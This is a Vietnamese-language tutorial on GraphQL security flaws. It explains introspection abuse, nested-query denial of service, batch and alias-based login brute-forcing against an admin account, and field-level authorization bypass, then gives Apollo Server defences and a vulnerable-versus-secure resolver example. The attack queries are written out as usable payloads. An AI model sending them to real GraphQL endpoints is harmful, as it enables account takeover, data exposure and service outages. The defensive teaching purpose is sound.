# GraphQL Vulnerabilities

> **CWE**: CWE-200, CWE-400 | **Phân loại**: API Security

## Kiến thức Nền tảng
Hãy tưởng tượng bạn bước vào một thư viện lớn để tìm sách. Ở thư viện truyền thống (tương đương với REST API), mỗi khi bạn muốn lấy thông tin, thủ thư sẽ đưa cho bạn nguyên cả một chồng sách dày cộp (tải toàn bộ tài nguyên), dù bạn chỉ cần đọc đúng một trang. Để giải quyết sự lãng phí này, thư viện nâng cấp lên mô hình **GraphQL**. Bây giờ, bạn chỉ cần viết một mẩu giấy yêu cầu chính xác: "Tôi muốn lấy trang 5, dòng 10 của cuốn sách X". Thủ thư sẽ chỉ cắt đúng dòng chữ đó và đưa cho bạn. Quá trình trao đổi diễn ra cực kỳ nhanh chóng và tiết kiệm. GraphQL gom mọi yêu cầu của bạn qua một ô cửa duy nhất (endpoint `/graphql`) và thực hiện 3 hành động chính: đọc thông tin (Query), ghi/sửa thông tin (Mutation) và theo dõi trực tiếp (Subscription).

Để phục vụ tốt hơn, thư viện có sẵn một cuốn sổ tay hướng dẫn chi tiết (gọi là **Introspection**). Cuốn sổ này ghi rõ: thư viện có những kệ sách nào, mỗi cuốn sách chứa những chương mục gì và cách tìm kiếm ra sao. Mặc dù đây là cẩm nang hữu ích cho nhân viên thư viện, nhưng nếu lọt vào tay kẻ xấu, hắn sẽ nắm rõ từng vị trí bố trí của cả thư viện.

Bên cạnh đó, vì thư viện chỉ phục vụ tại một ô cửa duy nhất, nên các biện pháp giới hạn dòng người xếp hàng kiểu cũ (rate limit dựa trên URL) hoàn toàn bị vô hiệu hóa. Khách hàng cũng có thể nộp cùng lúc cả xấp giấy yêu cầu trong một lần gặp thủ thư (kỹ thuật gửi truy vấn hàng loạt - **Batch Queries**), khiến thủ thư phải làm việc đến kiệt sức.

```graphql
# Normal GraphQL query — client requests exactly what it needs
query {
  user(id: "123") {
    name
    email
    orders {
      id
      total
    }
  }
}

# Normal mutation — creating a new resource
mutation {
  createPost(input: { title: "Hello", body: "World" }) {
    id
    createdAt
  }
}
```

```json
// Normal GraphQL response — returns only requested fields
{
  "data": {
    "user": {
      "name": "Alice",
      "email": "alice@example.com",
      "orders": [
        { "id": "o1", "total": 99.99 }
      ]
    }
  }
}
```

## Mô tả lỗ hổng
Lỗ hổng **GraphQL Vulnerabilities (Các lỗ hổng đặc thù trong GraphQL)** nảy sinh từ việc nhà phát triển quá chú trọng vào tính linh hoạt mà quên mất việc đặt ra các quy tắc bảo vệ.

Kẻ tấn công có thể lợi dụng những tính năng ưu việt của GraphQL để phản công lại chính hệ thống:
- **Lạm dụng Introspection (Tự quan sát)**: Kẻ tấn công truy vấn cuốn sổ tay hướng dẫn để đọc toàn bộ cấu trúc cơ sở dữ liệu, phát hiện ra các hàm ẩn của quản trị viên và các điểm yếu trong API.
- **Truy vấn lồng nhau gây DoS (Nested Query DoS)**: Hắn gửi một câu hỏi lặp vòng vô hạn, ví dụ: "Tìm bạn của tôi, rồi tìm bạn của bạn tôi, rồi lại tìm bạn của người bạn đó..." (truy vấn lồng nhau theo cấp số nhân). Hệ thống sẽ bị nghẽn mạch cơ sở dữ liệu, vắt kiệt RAM của máy chủ và sập nguồn.
- **Tấn công vét cạn qua Batch Query (Gộp truy vấn)**: Thay vì gửi 1.000 yêu cầu đăng nhập riêng lẻ để dò mật khẩu (hành vi dễ bị tường lửa phát hiện và chặn), kẻ tấn công nén cả 1.000 truy vấn này vào làm một. Tường lửa chỉ đếm là 1 yêu cầu hợp lệ, nhưng máy chủ phía sau lại âm thầm thực hiện 1.000 lần kiểm tra mật khẩu.
- **Vượt qua kiểm tra quyền hạn cấp trường (Authorization Bypass)**: Hệ thống chỉ kiểm tra xem người dùng có quyền vào thư viện hay không, chứ không kiểm tra xem họ có được phép đọc các trang tài liệu tuyệt mật hay không (thiếu field-level authorization).
- **Lỗi chèn mã độc (Injection)**: Lạm dụng các biến số đầu vào của GraphQL để chèn các câu lệnh SQL độc hại hoặc mã hệ thống.

## Cơ chế tấn công
**1. Introspection — Khám phá toàn bộ API schema:**

```graphql
# Full introspection query — reveals ALL types, fields, and mutations
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name } }
      }
    }
  }
}

# Discover specific hidden queries
query {
  __type(name: "Query") {
    fields {
      name          # Reveals: users, adminPanel, internalMetrics, debugLog...
      description
    }
  }
}
```

**2. Nested Query DoS — Exponential resource consumption:**

```graphql
# Deeply nested query — each level multiplies database queries
# If user has 10 friends, each with 10 friends... = 10^5 = 100,000 DB queries!
query NestedDoS {
  users {                    # Level 0: 100 users
    friends {                # Level 1: 100 × 50 friends = 5,000
      friends {              # Level 2: 5,000 × 50 = 250,000
        friends {            # Level 3: 250,000 × 50 = 12,500,000
          friends {          # Level 4: CRASH — server out of memory
            name
            email
          }
        }
      }
    }
  }
}
```

**3. Batch Query — Brute force OTP/password trong một request:**

```json
// Single request with 1000 login attempts — bypasses rate limiting!
// Rate limiter sees: 1 request to /graphql ✓
// Server processes: 1000 login mutations
[
  {"query": "mutation { login(user:\"admin\", pass:\"000000\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"000001\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"000002\") { token } }"},
  // ... 997 more attempts ...
  {"query": "mutation { login(user:\"admin\", pass:\"999999\") { token } }"}
]
```

**4. Alias-based batching (khi array batching bị chặn):**

```graphql
# Use aliases to send multiple queries in a single query string
query {
  attempt1: login(user: "admin", pass: "123456") { token }
  attempt2: login(user: "admin", pass: "password") { token }
  attempt3: login(user: "admin", pass: "admin123") { token }
  # Each alias is a separate resolver execution
  # Rate limiter sees ONE query, but 3 login attempts happen
}
```

**5. Authorization bypass — Accessing fields without proper checks:**

```graphql
# Normal user query — should only see their own data
query {
  user(id: "other-user-id") {
    name
    email
    ssn              # Sensitive field — no field-level auth check!
    creditCardLast4  # Another sensitive field exposed
    role             # Reveals admin/user role
  }
}
```

## Biện pháp phòng thủ
```javascript
// Apollo Server — disable introspection in production
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production', // Only in dev
});
```
```javascript
// Using graphql-depth-limit and graphql-query-complexity
const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');
const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    depthLimit(5),                         // Max 5 levels of nesting
    createComplexityLimitRule(1000, {       // Max complexity score of 1000
      scalarCost: 1,
      objectCost: 10,
      listFactor: 20,                      // Lists multiply cost significantly
    }),
  ],
});
```
```javascript
// Count operations, not HTTP requests
app.use('/graphql', (req, res, next) => {
  const body = req.body;
  const operationCount = Array.isArray(body) ? body.length : 1;
  // Apply rate limit based on total operation count
  if (operationCount > 5) {
    return res.status(429).json({ error: 'Too many operations per request' });
  }
  next();
});
```

- **Tóm tắt**: Bảo mật GraphQL bằng cách tắt tính năng Introspection trên production, giới hạn query depth/complexity và triển khai rate limit theo operation.
- **Các bước chi tiết**:
  - **Tắt introspection trong production:**
  - **Giới hạn query depth và complexity:**
  - **Rate limit theo operation, không theo request:**
  - **Field-level authorization** — kiểm tra quyền truy cập cho từng field nhạy cảm.
  - **Disable query batching** nếu không cần thiết.

## Code Example
```javascript
// === VULNERABLE: No depth limit, no auth checks, introspection enabled ===
const resolvers = {
  Query: {
    user: (_, { id }) => db.users.findById(id),  // No authorization check!
  },
  User: {
    friends: (user) => db.users.findFriendsByUserId(user.id), // Allows infinite nesting
    ssn: (user) => user.ssn,  // Sensitive field with no access control
  },
};

// === SECURE: Depth-limited, authorized, introspection disabled ===
const resolvers = {
  Query: {
    user: (_, { id }, context) => {
      // Verify the requesting user has permission to view this profile
      if (context.user.id !== id && context.user.role !== 'admin') {
        throw new ForbiddenError('Access denied');
      }
      return db.users.findById(id);
    },
  },
  User: {
    ssn: (user, _, context) => {
      // Field-level auth: only the user themselves or admins can see SSN
      if (context.user.id !== user.id && context.user.role !== 'admin') {
        return null;  // Return null instead of throwing to avoid info leakage
      }
      return user.ssn;
    },
  },
};
```

## Xem thêm
- [Các bài học liên quan trong cùng thư mục](../)

## Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/graphql
- OWASP: https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
- CWE-400: https://cwe.mitre.org/data/definitions/400.html
- HackTricks: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html

## Giải thích thuật ngữ
- **GraphQL**: Ngôn ngữ truy vấn dữ liệu cho API được thiết kế để client có thể yêu cầu chính xác dữ liệu họ cần, tránh lãng phí băng thông.
- **Schema**: Bản thiết kế kỹ thuật mô tả cấu trúc dữ liệu, kiểu dữ liệu và toàn bộ các truy vấn khả dụng của một hệ thống GraphQL API.
- **Introspection**: Tính năng đặc biệt của GraphQL cho phép người dùng hỏi hệ thống để lấy thông tin chi tiết về schema hiện tại.
- **Resolver**: Các đoạn mã hoặc hàm xử lý trong GraphQL chịu trách nhiệm lấy dữ liệu thực tế cho từng trường thông tin được yêu cầu.
- **Query**: Thao tác truy vấn để đọc dữ liệu từ hệ thống.
- **Mutation**: Thao tác làm thay đổi trạng thái dữ liệu (như ghi mới, cập nhật hoặc xóa dữ liệu).
- **Batch Queries**: Kỹ thuật đóng gói nhiều câu truy vấn GraphQL vào chung một yêu cầu mạng duy nhất để tiết kiệm số lần kết nối.
- **Query Depth (Độ sâu truy vấn)**: Mức độ lồng ghép giữa các thực thể trong câu truy vấn, chỉ ra mức độ phân cấp của dữ liệu được yêu cầu.
- **Field-level Authorization**: Cơ chế phân quyền chi tiết xuống từng trường thông tin cụ thể của đối tượng, ngăn chặn việc truy cập thông tin trái phép.
- **Alias (Bí danh)**: Kỹ thuật đặt tên tùy chỉnh cho các trường dữ liệu trả về trong GraphQL, có thể bị lạm dụng để gộp nhiều truy vấn trùng tên vào một request.
